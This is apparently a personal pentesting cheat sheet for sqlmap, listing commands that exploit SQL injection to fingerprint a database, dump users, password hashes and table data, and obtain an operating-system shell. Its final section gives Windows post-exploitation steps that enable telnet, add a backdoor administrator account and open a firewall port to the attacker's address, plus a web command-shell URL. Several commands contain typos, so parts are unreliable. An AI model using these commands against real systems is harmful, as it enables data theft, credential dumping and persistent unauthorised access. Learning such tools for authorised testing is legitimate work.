# Using SqlMap

```shell
> sqlmap -u URl -data DataToSentInPost -p PARAMETER(id) --level 3 risk 3 -random-agent --tor --check-tor --delay=500 --randomize=delay
```

## SQLMAP

## First we try to get which DB is running on the server

```Shell
time sqlmap -r /path/to/request/file.txt --fingerprint
```

### Another syntax

You copy the request with header and body from ZAP/burp and save it to a file then

```Shell
time sqlmap -r /path/to/request/file.txt --fingerprint
```

## Grabbing server banner

```Shell
time sqlmap -r /path/to/request/file.txt --banner
```

## Grabbing current user, current db, host name & is the current user an admin

```Shell
time sqlmap -r /path/to/request/file.txt --current-user --current-db --hostname --is-dba
```

## Grabbing DB users (and passwords is is-dba == true)

```Shell
time sqlmap -r /path/to/request/file.txt --users --passwords
```

## Grabbing DBs

```Shell
time sqlmap -r /path/to/request/file.txt --dbs
```

## Grabbing Tables

```Shell
time sqlmap -r /path/to/request/file.txt -D <db_name> --tables
```

## Grabbing Columns

```Shell
time sqlmap -r /path/to/request/file.txt -D <db_name> -T <table1, table2> --columns
```

## Grabbing data from specific columns

```Shell
time sqlmap -r /path/to/request/file.txt -D <db_name> -T <table_name> -C <column1,column2,column3> --dump
```

Sometimes sqlmap can not find a unique column to figure out how many rows are there,
so the work-around is to sort a column value so sqlmap figure out how many row are there

```Shell
time sqlmap -r /path/to/request/file.txt -D <db_name> -T <table_name> --sql-query="SELECT column4,column7 FROM <db_name>.<table_name> ORDER BY <column4> DESC"
```

OR

```Shell
time sqlmap -r /path/to/request/file.txt --sql-query="SELECT column4,column7 FROM <db_name>.<table_name> ORDER BY <column4> DESC"
```

## Alternative way to get data from a DB

```Shell
time sqlmap -r /path/to/request/file.txt -D <Db_name> --sql-query="SELECT column_name from information_schema.columns where table_name = 'user'"
```

## Adding custom prefix or suffix to the sql query

```Shell
time sqlmap -r /path/to/request/file.txt --prefix="SELSCT * FROM <table_name> WHERE column_name='" --suffix=" -- " --banner
```

## Getting os-shell on the system

```Shell
time sqlmap -r /path/to/request/file.txt --os-shell
```

### Working with O/S Shell

- To see transactions ' tcpdump -i eth1 -vvv -X'

- How O/S Shell works
  - Sqlmap put on the server two files:
    - 1st stage uploader
    - 2nd stage Command Shell Page

- In case of the server is Windows, you can get access through the firewall like that

```Shell
> sc query state= all
> sc query tlnsvr
> sc config tlnserver start= demand
> sc start tlnsvr
> net user root toor /add
> net localgroup TelnetClients /add
> net localgroup Administrators root /add
> net localgroup TelnetClients root /add
> netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom adresses=<your.public.ip.address>
```

- You also can access the command prompt through the webpage like that

http://server.url/<tmp file name>/cmd=ping%20<ip address>
